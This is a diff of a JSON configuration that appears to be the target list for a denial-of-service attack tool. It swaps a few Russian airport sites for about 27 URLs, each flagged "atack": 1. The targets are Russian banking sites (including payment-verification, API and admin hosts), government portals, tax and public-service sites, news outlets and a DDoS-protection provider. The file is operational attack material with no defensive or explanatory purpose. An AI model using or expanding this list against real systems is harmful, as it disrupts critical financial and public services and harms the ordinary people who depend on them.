@@ -1,18 +1,106 @@
 [
-  {
-    "page": "http://dme.ru/",
+    {
+    "page": "https://online.sberbank.ru/",
     "atack": 1
   },
   {
-    "page": "http://vnukovo.ru/",
+    "page": "http://www.kremlin.ru/",
     "atack": 1
   },
   {
-    "page": "http://svo.aero/ru/main",
+    "page": "http://mil.ru/",
     "atack": 1
   },
   {
-    "page": "http://abakan.aero",
+    "page": "http://rg.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://online.vtb.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://vesti.ru/",
+    "atack": 1
+  },
+  {
+    "page": "https://www.gazeta.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://reglament.council.gov.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://lenta.ru/",
+    "atack": 1
+  },
+  {
+    "page": "https://www.nalog.gov.ru/",
+    "atack": 1
+  },
+  {
+    "page": "https://ria.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://www.rbc.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://cbr.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://tass.ru",
+    "atack": 1
+  },
+  {
+    "page": "http://ya.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://rt.com/",
+    "atack": 1
+  },
+  {
+    "page": "https://gosuslugi.ru",
+    "atack": 1
+  },
+  {
+    "page": "http://ddos-guard.net/",
+    "atack": 1
+  },
+  {
+    "page": "http://3dsec.sberbank.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://api.sberbank.ru/",
+    "atack": 1
+  },
+  {
+    "page": "https://www.mos.ru/uslugi/",
+    "atack": 1
+  },
+  {
+    "page": "http://www.tinkoff.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://admin.gazprombank.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://api.developer.sber.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://alfabank.ru/",
+    "atack": 1
+  },
+  {
+    "page": "http://vtb.com/",
     "atack": 1
   }
 ]
